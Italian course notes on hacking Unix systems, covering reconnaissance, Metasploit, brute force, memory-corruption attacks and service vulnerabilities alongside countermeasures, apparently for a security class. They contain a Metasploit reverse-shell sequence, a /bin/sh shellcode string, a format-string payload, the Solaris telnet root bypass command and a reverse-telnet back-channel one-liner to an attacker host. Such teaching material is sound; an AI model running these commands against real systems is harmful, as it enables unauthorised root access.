
# 5 - Hacking Unix 1
## Contesto

Il mondo **Unix/Linux** è onnipresente (server, embedded, IoT) → superficie d’attacco enorme.  
Obiettivo costante dell’attaccante: **ottenere _root_**.

## Perché Unix è un target appetibile

- **Open-source e diffusione**: codice ispezionabile, ovunque.  
- Sistemi spesso esposti su Internet (*hosting*, cloud, edge).  
- Configurazioni frettolose annullano difese come ACL, *SELinux*.  

## Strategia d’attacco “classica”

1. *Footprinting* — raccolta passiva: `whois`, DNS, OS fingerprinting.  
2. *Scanning* — porte/versioni con `nmap`, `masscan`.  
3. *Enumeration* — banner grabbing, RPC dump, SNMP walk.  
4. *Vulnerability mapping* — connettere versioni ↔ database CVE.

> **Regola d’oro:** non puoi bucare ciò che non vedi: nascondere servizi allunga i tempi d’attacco.

## Toolbox essenziale

- **Nmap** — discovery + service/version detection.  
- **Nessus / OpenVAS** — scan plugin, output `.nessus`.  
- **Hydra / Medusa** — brute-force parallelo.  
- **Metasploit**

---

## Metasploit Framework

### Architettura

- Moduli: `exploit`, `auxiliary`, `payload`, `post`, `encoder`.  
- Caricamento dinamico in Ruby (`modules/`).  
![[Pasted image 20250515155519.png|500]]

### Terminologia

- **Exploit** – vettore che innesca la vuln.  
- **Payload** – codice che gira dopo (es. reverse shell).  
- **Session** – canale interattivo col target.

### Interfacce & workflow

CLI `msfconsole`, generator `msfvenom`, GUI Armitage.  

Flusso tipico:
```terminal
use exploit/multi/...
set RHOSTS 192.0.2.10
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 198.51.100.1
exploit
```

---

## Comandi core Metasploit

- `search`
- `info`
- `show options`
- `set`
- `run`
- `sessions`
- `background`

---

## Quattro vie per l’accesso remoto

- **Servizio in ascolto vulnerabile** (overflow, config. errata).  
- **Instradamento attraverso host Unix** (source-routing, tunneling SSH).  
- **Esecuzione indotta dall’utente** (phishing, trojan).  
- **Attacco in modalità promiscua** (sniffer compromesso).  

---

## Sfruttare un servizio in ascolto

- Cercare **credenziali di default / deboli**.  
- Dizionari + brute-force parallelo.  
- Contromisure: `fail2ban`, strozzatura rete, 2FA.

---

## Brute-force

- Bersagli comuni: SSH, FTP, POP3, RDP, MySQL, …  
- **Hydra / Medusa**: moduli, threading, resume.

### Formula:

$$
\text{Tentativi / s} = \frac{\text{connessioni parallele}}{\text{tempo handshake}}
$$

### Difese

- Blocco IP  
- Account lockout

---

## Data-driven attack: memory corruption

### Buffer Overflow

- Si verifica quando un utente o un processo tenta di inserire in un buffer (o in un array fisso) una quantità di dati superiore a quella precedentemente allocata
- Associato a specifiche funzioni C strcpy(), strcat(), sprintf() ecc. 
- Gli aggressori sfruttano un buffer overflow nel sistema di destinazione per eseguire un codice dannoso a loro scelta.
![[Pasted image 20250515161942.png]]
Control-Flow Graph (CFG) represents the valid execution paths that a program may follow at runtime Legitimate flows are: A->B->E->D OR A->C->F->D
![[Pasted image 20250515162005.png]]
![[Pasted image 20250515162026.png]]![[Pasted image 20250515162032.png]]
L'obiettivo è saltare l'esecuzione al codice iniettato
- Se il buffer fosse abbastanza grande da contenere il codice di exploit (ad esempio, 128 byte) e si sovrascrivesse l'indirizzo della ret con quello del buffer?
![[Pasted image 20250515162148.png]]
- Lo stack è di sola lettura, solo la sezione di codice (.text) è eseguibile
	- Non è possibile iniettare la sezione di codice, è di sola lettura.
	- Non si può eseguire dallo stack se non è eseguibile.
- Ritorno a libc: nessun codice iniettato. Utilizzare la libreria standard C (libc) invece di tornare al codice posizionato sullo stack
- Overflow dell'indirizzo di ritorno in una nuova posizione in codice eseguibile esistente nella libc
	- exec(), printf(), open(), exit() ecc.
- Bypassare la prevenzione dell'esecuzione dello stack
![[Pasted image 20250515162355.png]]
Hacking Unix 54
- Invece di mettere lo shellcode sullo stack, si possono mettere gli arg “/bin/sh”.
- Trovare l'indirizzo della funzione libc richiesta (ad esempio, exec)
- Salta alla funzione exec con “/bin/sh” come argomento
	- spawn shell con gli stessi privilegi del processo sfruttato
![[Pasted image 20250515162610.png]]

Programmazione orientata al ritorno (ROP)
- Generalizzazione degli attacchi return-to-libc
- Invece di ritornare alle funzioni di sistema di libc, ritornare al codice esistente che si trova già nello spazio degli indirizzi del programma
- Creare codice arbitrario concatenando insieme sequenze di codice breve (gadget)

![[Pasted image 20250515162726.png|500]]

## Esempio di Buffer Overflow Attack

Sfruttare il demone sendmail per ottenere l'accesso remoto:
Assumendo che il comando VRFY sia un buffer di lunghezza fissa di 128 byte, gli aggressori inviano un codice specifico che fa traboccare il buffer ed esegue il comando:

```terminal
bin/sh: char shellcode[]= “\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0 b” “\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xc d” “\x80\xe8\xdc\xff\xff\xff/bin/sh”;
```

## Remote Buffer Overflow Attack Countermeasures

- Pratiche di codifica sicure
	- Abilitare Stack Smashing Protector (SSP) di gcc, convalidare gli input modificabili dall'utente, utilizzare routine più sicure, ridurre la quantità di codice eseguito con privilegi di root, ecc.
- Test e verifica di ogni programma
- Disattivare i servizi inutilizzati o pericolosi
	- Se sono inutilizzati, perché tenerli?
	- Controllo degli accessi con wrapper TCP (tcpd), xinetd, iptables, ipf
- Protezione dell'esecuzione dello stack
	- Supportato in Solaris
	- Supportato in Linux con due patch del kernel: Exec Shield, GRSecurity
	- Non a prova di proiettile: distribuzione di codice che sfrutta una condizione di overflow del buffer
	- Heap-based overflow: overrunning della memoria allocata dinamicamente
- Randomizzazione del layout dello spazio degli indirizzi (ASLR)
	- Spazio degli indirizzi del processo randomizzato ogni volta che viene creato un processo
	- Rende difficile per un utente malintenzionato trovare il codice iniettato ed eseguirlo.

## Format String Attacks

Cosa succede se abbiamo più specificatori di formato che parametri?
![[Pasted image 20250515163422.png]]

Può essere utilizzato per:
- visualizzare lo stack: %08x stampa 8 byte
- leggere posizioni di memoria arbitrarie

```c
printf ("\x10\x01\x48\x08 %x %x %x %x %x %x %s");
```

scrivere un numero intero in qualsiasi punto della memoria: %n

```c
void func(){ char user_input[100]; ... scanf("%s", user_input); printf(user_input); }
```

![[Pasted image 20250515163552.png]]

### Format String Attacks Countermeasures

- Applicazione di contromisure per l'overflow del buffer (ASLR)
- I compilatori moderni dispongono di opzioni per avvertire gli sviluppatori che fanno un uso improprio delle funzioni `printf()`
- Programmazione sicura e verifiche del codice

## Input Validation Attacks

Il server non analizza correttamente l'input prima che lo passi a un'ulteriore elaborazione.
Questi attacchi funzionano quando i dati forniti dall'utente non vengono verificati e puliti prima dell'esecuzione.
Il demone Telnet passa un input sintatticamente errato a il programma di login.
- L'attaccante potrebbe aggirare l'autenticazione senza che venga richiesta una password.

Solaris 10 nel 2007 presentava una vulnerabilità in telnet>
```terminal
telnet -l "-froot" 192.168.1.101
```
Concedeva l'accesso di root al server senza richiedere una password.

Due approcci per eseguire la convalida dell'input:
- La convalida della lista nera esclude gli input noti come dannosi (Fortemente sconsigliato)
- La convalida della lista bianca consente solo l'inserimento di input noti e buoni (Consigliato)

## Integer Overflow and Integer Sign Attacks

  

Una variabile intera può gestire solo valori fino a una dimensione massima
Se si immette un numero più grande, come 60.000, il computer lo interpreta come -5536.
I programmi vulnerabili possono essere indotti ad accettare grandi quantità di dati, aggirando la convalida dei dati.

```c
int16_t len = get_input_len();
if (len > 256) error(); else strncpy(buf, user_data, len);
```

strncpy converte len=-5536 in un int senza segno, cioè 27231

### Countermeasures
- The same as buffer overflows.
- Secure programming practices

## Remote Command Execution

Sfruttare l'accesso alla shell interattiva per accedere da remoto a un server UNIX.
- Telnet, rlogin o SSH

Sfruttare servizi non interattivi per eseguire comandi
- RSH, SSH o Rexec

### Reverse telnet e Back Channel

Back channel: il canale di comunicazione ha origine dal sistema bersaglio
- al contrario dello sfruttamento dei servizi di login remoto dal sistema attaccante.

Il reverse telnet utilizza i servizi telnet per creare un canale posteriore dal sistema di destinazione al sistema dell'attaccante.

1. L'attaccante esegue i seguenti comandi in due finestre separate sul sistema dell'attaccante
```terminal
nc -l -n -v -p 80
nc -l -n -v -p 25
```
![[Pasted image 20250515221314.png]]

2. L'attaccante sfrutta una vulnerabilità per eseguire il seguente comandonel sistema di destinazione
```terminal
telnet 192.168.56.102 80 | sh | telnet 192.168.56.102 25
```
![[Pasted image 20250515221419.png]]

3. Ora le finestre di shell dell'aggressore sono collegate al sistema di destinazione.
![[Pasted image 20250515221457.png]]

4. L'aggressore esegue un comando nella prima finestra su sistema dell'aggressore. Il sistema di destinazione legge il comando, lo esegue localmente e restituisce il risultato alla seconda finestra dell'aggressore.
![[Pasted image 20250515221544.png]]

### Back-Channel Countermeasures

- Disattivare i servizi non necessari
- Rimuovere X dai sistemi ad alta sicurezza (no xterm)
- Eseguire il server web come "nobody" e negare a "nobody" i permessi di esecuzione per telnet
	- ```chmod 750 telnet```
- Alcuni firewall possono consentire di bloccare le connessioni al server Web o ai sistemi interni.

### Common Types of Remote Attacks

### FTP
- I server FTP a volte permettono agli utenti anonimi di caricare i file.
- Accesso anonimo + directory scrivibile in tutto il mondo
- Una configurazione errata può consentire l'attraversamento delle directory
	- Accesso a file sensibili
- Overflow del buffer e altre vulnerabilità
	- Vulnerabilità della stringa di formato "site exec" in wu-ftp consente l'esecuzione di codice arbitrario come root

#### Contromisure
- Evitare l'FTP se possibile
- Applicare una patch al server FTP
- Configurare accuratamente il server
- NO directory scrivibili in tutto il mondo, a meno che non sia necessario
- Lo stesso vale per l'accesso anonimo


### Sendmail
sendmail è un agente di trasferimento della posta (MTA) che viene utilizzato su molti sistemi UNIX.
Ha una lunga storia di numerose vulnerabilità
Se mal configurato, consente agli spammer di inviare posta indesiderata attraverso i vostri server.

#### Countermeasures
- Utilizzare l'ultima versione
- Indagare tutti gli alias che puntano a un programma piuttosto che a un account utente
- Assicurarsi che i permessi dei file degli alias e degli altri file correlati non consentano agli utenti di apportare modifiche.
- Considerare l'utilizzo di un MTA (più sicuro), come qmail o postfix.

### Remote Procedure Call

Numerose versioni stock di UNIX hanno molti servizi RPC abilitati per impostazione predefinita.
I servizi RPC sono complessi e generalmente vengono eseguiti con privilegi di root
- esempio:  ```rpc.ttdbserverd, rpc.cmsd```
Un buon obiettivo da sfruttare per ottenere una shell di root remota.

#### Countermeasures
- Disabilitare qualsiasi servizio RPC che non sia assolutamente necessario
- Considerare l'implementazione di un dispositivo di controllo degli accessi che consenta solo ai sistemi autorizzati di contattare le porte RPC
- Applicare le contromisure per l'overflow del buffer
- Utilizzare sempre RPC sicuro
- Fornisce un ulteriore livello di autenticazione basato sulla crittografia a chiave pubblica, ma causa problemi di interoperabilità

### NFS

- Il Network File System (NFS) consente l'accesso trasparente a file e directory di sistemi remoti come se fossero archiviati localmente.
- Sono state scoperte molte condizioni di buffer overflow relative a mountd, il server NFS.
- NFS mal configurato esporta il file system a tutti.

#### Countermeasures
- Disattivare l'NFS se non è necessario.
- Implementare i controlli di accesso del client e dell'utente per consentire l'accesso ai file richiesti solo agli utenti autorizzati.
- Esportare solo alcune directory
	- esempio : ```
```terminal
1. /etc/exports
2. /etc/dfs/dfstab
```
- Non includere mai l'indirizzo IP locale del server, o localhost, all'elenco dei sistemi autorizzati a montare il file system.
- L'interazione con altri servizi (esempio: portmapper) permette all'aggressore di falsificare le richieste come se provenissero dal localhost

### DNS
- Il DNS è uno dei pochi servizi quasisempre necessari e funzionanti sulla rete perimetrale Internet di un'organizzazione.
- L'implementazione più comune del DNS per UNIX è il pacchetto Berkeley Internet Name Domain (BIND).

#### BIND vulnerabilities
- I buffer overflow in BIND possono essere sfruttati con risposte malformate alle query DNS.
- Fornisce agli aggressori un certo grado di controllo remoto sul server, anche se non una vera e propria shell

#### Countermeasures
- Disabilitare BIND se non lo si utilizza
- Aggiornare BIND con una patch
- Eseguire il demone BIND “named” come utente non privilegiato di
- Eseguire BIND da una prigione chroot
	- Impedisce a un aggressore di attraversare il sistema
- Utilizzare djbdns, un sostituto sicuro, veloce e affidabile per BIND (trovate vulnerabilità)
![[Pasted image 20250515223624.png]]


### X Insecurities
- Il sistema X Window System consente a molti programmi di condividere un singolo display grafico.
- I client X possono catturare i tasti premuti dall'utente della console
- Uccidere le finestre
- Catturare le finestre per visualizzarle altrove
- Remappare la tastiera per impartire comandi nefasti indipendentemente da ciò che l'utente digita

#### X snooping tools
- **xscan** è uno strumento in grado di scansionare un'intera sottorete alla ricerca di un server X aperto e di registrare tutte le sequenze di tasti in un file di log.
- **xwatchwin** consente anche di vedere le finestre aperte dagli utenti
- Gli aggressori possono anche inviare sequenze di tasti a qualsiasi finestra.

#### Countermeasures
- Evitare xhost + command
- Utilizzare meccanismi di autenticazione più avanzati, come: MIT-MAGIC-COOKIE-1, XDM-AUTHORIZATION- 1 e MIT-KERBEROS- 5.
- Considerare l'uso di ssh e della sua funzionalità di tunneling per una maggiore sicurezza durante le sessioni X.


### SSH
SSH è ampiamente utilizzato come alternativa sicura a telnet ma ci sono integer overflow e altri problemi in alcuni pacchetti SSH che possono essere sfruttati, concedendo l'accesso root remoto

#### Countermeasures
- Eseguire le versioni patchate del client e del server SSH
- Considerare l'utilizzo della funzione di separazione dei privilegi, che crea un ambiente non privilegiato per l'esecuzione da parte di sshd (una jail chroot).


### OpenSSL
OpenSSL è un'implementazione open-source di Secure Socket Layer (SSL) ed è presente in molte versioni di UNI. Aveva una famosa vulnerabilità di buffer overflow che è stata sfruttata dal worm Slapper.

#### Countermeasures
- Applicare le patch appropriate e aggiornare a OpenSSL
- Disattivare SSLv2 se non è necessario.


### Apache
Apache è principalmente un server web (molto complesso e altamente configurabile).
Ha vulnerabilità, come ogni programma
- esempio: apache Killer DoS: sovrapposizione dell'intervallo di byte nelle richieste.

#### Countermeasures
- Utilizzare l'ultima versione
- Applicare le patch

## Riepilogo servizi critici e vulnerabilità

|Servizio|Vulnerabilità tipiche|Difese chiave|
|---|---|---|
|**FTP** (vsftpd 2.3.4)|Backdoor `:)` → shell root CVS 2011-2523|Disabilita anonimous, aggiorna, SFTP|
|**Sendmail**|Buffer overflow in `_parseaddr()`|Postfix, HIPS|
|**RPC/NFS**|`rpc.statd` overflow, NFS export rw|`hosts.deny`, `no_root_squash` off|
|**DNS/BIND**|Cache poisoning, overflow in `lwresd`|DNSSEC, split-horizon|
|**X11**|Autenticazione debole (xhost +)|Disabilita se headless, `xauth`|
|**SSH**|Bruteforce, `auth_bypass 2001`|Key-based auth, Banner, Fail2Ban|
|**OpenSSL**|**Heartbleed** CVE-2014-0160 → leak 64 kB/req|Aggiornare a >=1.0.1g|
|**Apache**|Slowloris / killer-DoS|`mod_reqtimeout`, HTTP/2 patches|
